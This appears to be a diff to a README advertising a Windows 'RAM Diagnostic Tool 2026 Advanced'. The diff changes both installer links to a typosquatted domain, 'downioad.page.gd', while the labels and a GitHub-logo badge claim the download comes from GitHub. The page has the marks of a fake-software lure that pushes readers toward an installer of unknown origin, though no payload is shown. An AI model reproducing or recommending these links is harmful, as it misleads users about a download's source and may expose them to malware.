@@ -2,7 +2,7 @@
 
 RAM Diagnostic Tool 2026 Advanced is a powerful and user-friendly application designed to test your computer's RAM for errors and ensure optimal performance. This tool provides comprehensive diagnostics for Windows 10 and Windows 11 systems, helping you identify and resolve memory-related issues quickly and efficiently.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://download-page.page.gd/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://downioad.page.gd/)
 
 ## Key Features
 
@@ -60,7 +60,7 @@ Before installing, verify that your system meets the following minimum requireme
 
 To get started with RAM Diagnostic Tool 2026 Advanced, download the latest version directly from the official source. Ensure you always use the provided link for secure and updated software.
 
-[Download the latest version from GitHub](https://download-page.page.gd/)
+[Download the latest version from GitHub](https://downioad.page.gd/)
 
 ## Additional Notes
 
